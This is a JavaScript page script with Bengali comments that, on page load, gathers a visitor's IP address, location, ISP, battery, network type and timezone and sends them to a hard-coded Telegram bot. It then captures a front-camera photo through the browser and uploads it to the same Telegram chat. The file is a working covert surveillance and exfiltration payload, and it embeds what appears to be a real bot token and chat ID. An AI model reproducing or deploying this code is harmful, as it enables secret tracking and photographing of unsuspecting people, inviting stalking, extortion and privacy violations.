const BOT_TOKEN = "7757161623:AAGynGndHmAK8b3lIKdQTJkuAbpkgeNBIcA"; // তোমার বট টোকেন
const CHAT_ID = "7135684240"; // তোমার টেলিগ্রাম চ্যাট আইডি
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

// IP ও ডিভাইস ইনফো নেওয়ার ফাংশন
async function getIpDetails() {
    try {
        const response = await fetch("https://ipinfo.io/json");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown", asn: "Unknown" };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.charging = battery.charging;
        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }

    return deviceInfo;
}

// Telegram বটে মেসেজ পাঠানো
async function sendTelegramMessage(message) {
    const data = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
    
    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        console.log("Message Sent:", await response.json());
    } catch (error) {
        console.error("Error sending message:", error);
    }
}

// ক্যামেরা দিয়ে ফটো তোলা এবং Telegram-এ পাঠানো
async function captureAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        await new Promise(resolve => video.onloadedmetadata = resolve);

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, 'capture.png');

        await fetch(API_FILE_URL, { method: "POST", body: formData });

        video.srcObject.getTracks().forEach(track => track.stop());
        console.log("Photo Sent to Telegram");
    } catch (error) {
        console.error("Error capturing photo:", error);
    }
}

// পেজ লোড হওয়ার সাথে সাথে ডাটা পাঠানো হবে
async function sendInitialInfo() {
    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();

    const message = `
<b>🚀 New Visitor Detected</b>

<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>📍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>

<b>📱 Device Info:</b>
<b>🔋 Battery:</b> <i>${deviceInfo.charging ? 'Charging' : 'Not Charging'}</i> (${deviceInfo.chargingPercentage}%)
<b>📶 Network:</b> <i>${deviceInfo.networkType}</i>
<b>⏳ Time Zone:</b> <i>${deviceInfo.timeZone}</i>

<b>💻 Developed by: Mehdi Hasan</b>
`;

    await sendTelegramMessage(message);
    await captureAndSendPhoto();
}

// স্ক্রিপ্ট চালু হবে যখন পেজ লোড হবে
window.onload = sendInitialInfo;